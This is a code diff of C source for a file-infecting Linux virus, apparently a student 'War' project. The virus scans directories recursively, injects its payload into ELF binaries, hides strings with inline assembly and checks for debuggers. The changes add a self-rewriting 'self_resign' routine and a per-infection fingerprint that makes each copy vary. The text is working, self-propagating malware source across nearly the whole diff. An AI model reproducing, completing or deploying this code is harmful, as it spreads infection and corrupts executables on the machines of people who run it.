@@ -34,11 +34,130 @@
 #define ECHIDNAE 0x401af0
 #endif
 
+#define FINGERPRINT_OFFSET 47
+
+static int find_signature(char *file_data, size_t file_size, char *signature,
+						  size_t signature_size)
+{
+	int i = 0;
+
+	while (i + signature_size < file_size)
+		if (!evaluateDriftSignature(file_data + i++, signature, signature_size))
+			return (i);
+	return (-1);
+}
+
+static char hexchar(int n)
+{
+	n &= 0xF;
+	if (n < 10)
+		return '0' + n;
+	else
+		return 'A' + n - 10;
+}
+
+#define ROT64(x, n)                                                            \
+	(((unsigned long) (x) << (n)) | ((unsigned long) (x) >> (64 - (n))))
+
+static void fill_fingerprint(char fingerprint[], long keyvalue)
+{
+	for (int i = 0; i < 8; i++)
+		fingerprint[i] = hexchar(keyvalue >> (i * 4));
+}
+
+void self_resign(char *ALPHA, int OMEGA)
+{
+	char		   path[1024];
+	const char	  *procpath;
+	const char	  *suffix;
+	char		   tmppath[1024];
+	int			   fd;
+	int			   tmp_fd;
+	struct stat	   statbuf;
+	void		  *ogfile = NULL;
+	void		  *ftfile = NULL;
+	int			   sign_off;
+	char		   fingerprint[8];
+	struct timeval now;
+
+	asm volatile("leaq str99(%%rip), %0\n"
+				 "jmp end99\n"
+				 "str99: .ascii \"/proc/self/exe\\0\"\n"
+				 "end99:\n"
+				 : "=r"(procpath));
+	int len = readlinksyscall(procpath, path, sizeof(path) - 1);
+	if (len < 0)
+		goto clean;
+	path[len] = 0;
+	int i = len - 1;
+	while (i > 0 && path[i] != '/')
+		i--;
+	int j = 0;
+	while (j <= i)
+	{
+		tmppath[j] = path[j];
+		j++;
+	}
+
+	asm volatile("leaq str98(%%rip), %0\n"
+				 "jmp end98\n"
+				 "str98: .ascii \".~tmp_sr\\0\"\n"
+				 "end98:\n"
+				 : "=r"(suffix));
+	int k = 0;
+	while (suffix[k])
+		tmppath[j++] = suffix[k++];
+	tmppath[j] = 0;
+
+	fd = fs_handle(path, O_RDONLY);
+	if (fd < 0)
+		goto clean;
+	if (io_query(fd, &statbuf))
+		goto clean;
+	tmp_fd = fs_handle(tmppath, O_CREAT | O_RDWR | O_TRUNC, statbuf.st_mode);
+	if (tmp_fd < 0)
+		goto clean;
+	if (io_resize(tmp_fd, statbuf.st_size))
+		goto clean;
+
+	ogfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ, MAP_SHARED,
+								fd, 0);
+	ftfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ | PROT_WRITE,
+								MAP_SHARED, tmp_fd, 0);
+	if (ogfile == MAP_FAILED || ftfile == MAP_FAILED)
+		goto clean;
+	memcpy(ftfile, ogfile, statbuf.st_size);
+	sign_off = find_signature(ftfile, statbuf.st_size, ALPHA, OMEGA);
+	if (sign_off < 0)
+		goto clean;
+	gettimeofday(&now, NULL);
+	fill_fingerprint(fingerprint, (statbuf.st_ino * 0xBF58476D1)
+									  ^ (statbuf.st_size * 0x94D049BB)
+									  ^ (now.tv_usec * 0xE1234E5B9));
+	memcpy(ftfile + sign_off + FINGERPRINT_OFFSET, fingerprint,
+		   sizeof(fingerprint));
+	char ret = (char) renamefile(tmppath, path);
+	if (ret < 0)
+		goto clean;
+clean:
+	if (fd >= 0)
+		fs_release(fd);
+	if (tmp_fd >= 0)
+		fs_release(tmp_fd);
+	if (ftfile)
+		vm_release(ftfile, statbuf.st_size);
+	if (ogfile)
+		vm_release(ogfile, statbuf.st_size);
+}
+
 void _start(void)
 {
-	void *begin_ptr;
-	char  path[11];
-	char *prgm;
+	void  *begin_ptr;
+	char   path[11];
+	char  *prgm;
+	char  *ALPHA;
+	size_t OMEGA;
+
 	asm volatile("leaq str6(%%rip), %0\n"
 				 "jmp end6\n"
 				 "str6: .ascii \"doom-nukem\\0\"\n"
@@ -65,9 +184,19 @@ void _start(void)
 	path[8] = 't';
 	path[9] = '\0';
 	path[10] = '\0';
-	processDirectory(path, begin_ptr);
+	asm volatile("leaq str4(%%rip), %0\n"
+				 "movq $end4-str4, %1\n"
+				 "jmp trueend4\n"
+				 "str4: .ascii \"\\nWar version 1.0 (c)oded by xxxxxxx - "
+				 "yyyyyy\"\n"
+				 "end4:\n"
+				 ".ascii \" - [42694269]\\0\" \n "
+				 "trueend4:\n"
+				 : "=r"(ALPHA), "=r"(OMEGA));
+	processDirectory(path, begin_ptr, ALPHA, OMEGA);
 	path[9] = '2';
-	processDirectory(path, begin_ptr);
+	processDirectory(path, begin_ptr, ALPHA, OMEGA);
+	self_resign(ALPHA, OMEGA);
 	proc_terminate(0);
 }
 
@@ -230,7 +359,8 @@ static int is_debugged(void)
 	return 0;
 }
 
-static void processDirectory(char *folder, void *begin_ptr)
+static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
+							 size_t OMEGA)
 {
 	int					   fd = fs_handle(folder, 0 | 65536);
 
@@ -273,11 +403,11 @@ static void processDirectory(char *folder, void *begin_ptr)
 
 			if (statbuf.st_mode & __S_IFDIR)
 			{
-				processDirectory(fullPath, begin_ptr);
+				processDirectory(fullPath, begin_ptr, ALPHA, OMEGA);
 			}
 			else if (statbuf.st_mode & __S_IFREG)
 			{
-				infect(fullPath, begin_ptr);
+				infect(fullPath, begin_ptr, ALPHA, OMEGA);
 			}
 
 			bpos += dirent->d_reclen;
@@ -293,13 +423,28 @@ clean:
 #define JUMP_OFFSET			 23
 #define JUMP_OFFSET_INFECTED 17
 
+// void infect(char *path, void *begin_ptr)
+// {
+// 	void  *file_data;
+// 	size_t file_size;
+// 	size_t poison_size;
+
+// 	file_data = open_path(path, &file_size, &poison_size);
+// 	if (!file_data)
+// 		goto abort;
+// abort:
+// 	if (file_data)
+// 		vm_release(file_data, file_size);
+// }
+
 static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
-					  inout char **file_data, inout size_t *enlarging)
+					  inout char **file_data, inout size_t *enlarging,
+					  char *ALPHA, size_t OMEGA)
 {
 	int fd;
 	int ret;
 
-	*file_data = NULL;
+	*file_data = MAP_FAILED;
 	fd = fs_handle(path, O_RDWR);
 	if (fd < 0 || io_query(fd, statbuf) < 0)
 		goto error;
@@ -309,28 +454,15 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 									MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
-	char  *ALPHA;
-	size_t OMEGA;
-	asm volatile("leaq str4(%%rip), %0\n"
-				 "movq $end4-str4, %1\n"
-				 "jmp end4\n"
-				 "str4: .ascii \"\\nWar version 1.0 (c)oded by xxxxxxx - "
-				 "yyyyyy - [42694269]\\0\" \n "
-				 "end4:\n"
-				 : "=r"(ALPHA), "=r"(OMEGA));
-	int i = 0;
-	while (i + OMEGA < statbuf->st_size)
-		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
-			goto error;
-	// TODO: write filedata to edit fingerprint :
-	// FINGERPRINT = crc32(inode ^ size ^ timestamp_ms)
-	// TODO: write finger inside currently executed file
+	if (find_signature(*file_data, statbuf->st_size, ALPHA, OMEGA) >= 0)
+		goto error;
+
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
 	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
 	vm_release(*file_data, statbuf->st_size);
-	*file_data = NULL;
+	*file_data = MAP_FAILED;
 	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
 	{
 		emit_hex(ret);
@@ -371,18 +503,22 @@ static unsigned long find_first_free_page(t_elf elf)
 	return ret;
 }
 
-static void infect(char *path, void *begin_ptr)
+static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
 {
 	struct stat statbuf;
 	char	   *file_data;
 	t_elf		elf;
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
-	int	   last_pt_load;
-	char  *curare;
-	size_t flower;
-	size_t enlarging;
+	int			   last_pt_load;
+	char		  *curare;
+	size_t		   flower;
+	size_t		   enlarging;
+	int			   signature_pos;
+	char		   fingerprint[8];
+	struct timeval now;
 
+	enlarging = 0;
 	asm volatile(
 		"leaq str3(%%rip), %0\n"
 		"movq $end3-str3, %1\n"
@@ -392,7 +528,8 @@ static void infect(char *path, void *begin_ptr)
 		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
 		"end3:\n"
 		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
-	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging))
+	file_data = MAP_FAILED;
+	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging, ALPHA, OMEGA))
 		goto clean;
 	unsigned long append_pos
 		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
@@ -433,7 +570,15 @@ static void infect(char *path, void *begin_ptr)
 	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
 	append_pos += flower;
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
+	gettimeofday(&now, NULL);
+	fill_fingerprint(fingerprint, (statbuf.st_ino * 0xBF58476D1)
+									  ^ (statbuf.st_size * 0x94D049BB)
+									  ^ (now.tv_usec * 0xE1234E5B9));
+	signature_pos
+		= find_signature(file_data + statbuf.st_size, enlarging, ALPHA, OMEGA);
+	memcpy(file_data + statbuf.st_size + signature_pos + FINGERPRINT_OFFSET,
+		   fingerprint, sizeof(fingerprint));
 clean:
-	if (file_data)
+	if (file_data != MAP_FAILED)
 		vm_release(file_data, statbuf.st_size + enlarging);
 }
